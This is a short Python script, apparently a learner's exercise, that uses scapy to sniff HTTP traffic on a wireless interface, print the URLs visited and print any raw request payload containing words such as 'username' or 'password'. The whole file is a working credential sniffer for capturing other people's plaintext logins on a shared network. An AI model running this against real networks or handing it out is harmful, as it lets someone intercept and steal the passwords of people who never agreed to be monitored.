
import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    sniffer=scapy.sniff(iface=interface,store=False,prn=packet_processer)

def packet_processer(packet):
    #checking the packet has the layer http 
    if (packet.haslayer(http.HTTPRequest)):
        #host will contain a domian name and path will have the endpoints so we combining them to get our url
        url=(packet[http.HTTPRequest].Host)+ (packet[http.HTTPRequest].Path)
        print("urls:",str(url))
        #Raw is the layer in packet which will contain the username and password
        if (packet.haslayer(scapy.Raw)):
            load=(packet[scapy.Raw].load )
            load=str(load)
            #load is in byte format so we need to decode or convert it into str
            keywords=['username','password','user','pass','uname','pas','u','p']
            for k in keywords:
                if k in load:
                    print("username and password:",load)
                    break



sniffer('wlp1s0')
